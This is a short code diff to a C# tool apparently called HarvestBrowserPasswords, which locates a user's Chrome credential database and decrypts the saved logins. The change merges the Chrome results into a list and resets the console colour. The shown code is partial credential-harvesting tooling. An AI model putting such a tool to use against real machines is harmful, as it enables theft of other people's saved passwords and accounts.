@@ -38,7 +38,7 @@ namespace HarvestBrowserPasswords
             }
             else if (opts.Chrome)
             {
-                GetChromePasswords(userAccountName);
+                loginDataList = (loginDataList.Concat(GetChromePasswords(userAccountName))).ToList();
             }
             else if (opts.Firefox)
             {
@@ -91,6 +91,8 @@ namespace HarvestBrowserPasswords
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine($"[+] Found Chrome credential database for user: \"{userAccountName}\" at: \"{loginDataFile}\"");
+                    Console.ResetColor();
+
                     ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);
 
                     loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
